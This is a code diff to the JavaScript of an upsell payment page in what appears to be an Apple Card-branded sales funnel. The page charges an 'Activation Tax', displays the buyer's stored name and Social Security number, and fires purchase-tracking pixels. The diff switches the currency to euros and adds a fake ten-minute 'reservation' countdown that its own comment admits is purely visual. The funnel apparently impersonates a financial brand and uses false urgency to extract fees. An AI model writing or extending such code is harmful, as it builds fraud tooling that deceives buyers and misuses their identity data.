@@ -5,7 +5,7 @@
  *   {
  *     id:    'upp1-imposto',           // unique id, used as content_id
  *     title: 'Activation Tax',         // shown in tracking
- *     price: 17.45,                    // USD, two decimals
+ *     price: 17.45,                    // EUR, two decimals
  *     next:  '../upp2-ativacao/index.html'  // relative path for skip / success
  *   }
  *
@@ -28,7 +28,7 @@
   var amountCents = Math.round(cfg.price * 100);
 
   function $(id) { return document.getElementById(id); }
-  function fmtUSD(v) { return '$' + v.toFixed(2); }
+  function fmtEUR(v) { return '€ ' + v.toFixed(2); }
 
   function loadLead() {
     try { return JSON.parse(localStorage.getItem('applecard_lead') || '{}'); }
@@ -52,6 +52,26 @@
       });
     }
     return u.toString();
+  }
+
+  // ─── Urgency countdown (purely visual reservation timer, per upsell step) ───
+  function startUrgencyCountdown() {
+    var el = document.getElementById('urgencyTimer');
+    if (!el) return;
+    var key = 'applecard_urgency_' + cfg.id;
+    var deadline = parseInt(sessionStorage.getItem(key), 10);
+    if (!deadline || deadline < Date.now()) {
+      deadline = Date.now() + 10 * 60 * 1000; // 10 minutes
+      sessionStorage.setItem(key, String(deadline));
+    }
+    function tick() {
+      var remaining = Math.max(0, deadline - Date.now());
+      var mins = Math.floor(remaining / 60000);
+      var secs = Math.floor((remaining % 60000) / 1000);
+      el.textContent = mins + ':' + (secs < 10 ? '0' : '') + secs;
+      if (remaining > 0) setTimeout(tick, 1000);
+    }
+    tick();
   }
 
   // ─── Initial loading screen ───
@@ -85,19 +105,21 @@
     + '</div>';
 
   document.addEventListener('DOMContentLoaded', function () {
+    startUrgencyCountdown();
+
     var lead = loadLead();
     var customerName = $('customerName');
     if (customerName) customerName.textContent = lead.nome || '—';
-    var customerNif = $('customerNif');
-    if (customerNif) customerNif.textContent = (lead.ssn_masked || lead.ssn || lead.nif_masked || lead.nif || '—');
+    var customerIdNumber = $('customerIdNumber');
+    if (customerIdNumber) customerIdNumber.textContent = (lead.ssn_masked || lead.ssn || '—');
 
     var priceEls = document.querySelectorAll('[data-price-display]');
-    priceEls.forEach(function (el) { el.textContent = fmtUSD(cfg.price); });
+    priceEls.forEach(function (el) { el.textContent = fmtEUR(cfg.price); });
 
     if (window.track) {
       window.track('ViewContent', {
         value: cfg.price,
-        currency: 'USD',
+        currency: 'EUR',
         content_id: cfg.id,
         content_name: cfg.title,
         content_type: 'product'
@@ -109,7 +131,7 @@
 
     var skipBtn = $('skipBtn');
     if (skipBtn) skipBtn.addEventListener('click', function () {
-      if (window.track) window.track('UpsellSkipped', { content_id: cfg.id, value: cfg.price, currency: 'USD' });
+      if (window.track) window.track('UpsellSkipped', { content_id: cfg.id, value: cfg.price, currency: 'EUR' });
       goToNext();
     });
 
@@ -131,7 +153,7 @@
     if (window.track) {
       window.track('AddPaymentInfo', {
         value: cfg.price,
-        currency: 'USD',
+        currency: 'EUR',
         content_id: cfg.id,
         payment_method: 'cooud_hosted'
       });
@@ -145,7 +167,7 @@
 
     var payload = {
       amount: amountCents,
-      currency: 'usd',
+      currency: 'eur',
       payerName: lead.nome || 'Customer',
       email: lead.email || '',
       phone: lead.telefone || lead.phone || '',
@@ -204,7 +226,7 @@
               var eid = 'purchase_' + sessionId;
               window.ttq.track('Purchase', {
                 value: cfg.price,
-                currency: 'USD',
+                currency: 'EUR',
                 content_type: 'product',
                 content_id: cfg.id,
                 content_name: cfg.title,
